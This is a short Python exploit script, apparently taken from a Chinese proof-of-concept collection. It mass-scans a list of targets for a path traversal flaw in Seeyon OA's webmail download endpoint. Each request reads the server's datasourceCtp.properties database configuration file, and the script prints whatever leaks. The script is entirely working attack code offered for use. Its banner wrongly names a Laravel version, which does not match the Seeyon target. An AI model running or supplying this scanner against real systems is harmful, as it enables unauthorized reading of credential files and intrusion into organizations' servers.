import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 修改自佩奇文库

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Laravel framework <= 5.5.21                              \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

proxies = {
    "http":"http://127.0.0.1:2334",
    "https":"https://127.0.0.1:2334"
}

def POC_1(target_url):
    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
        if "workflow" in response.text:
            print("\033[32m[o] 目标{}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            return target_url
        else:
            #print("\033[31m[x] 文件请求失败 \033[0m")
            #sys.exit(0)
            return 
    except Exception as e:
        #print("\033[31m[x] 请求失败 \033[0m", e)
        return 

if __name__ == '__main__':
    title()
    #target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    with open('./targets.txt','r') as f:
        vuln = []
        for line in f.readlines():
            line = line.strip('\n')
            #print(line)
            vuln.append(POC_1(line))
    print(vuln)
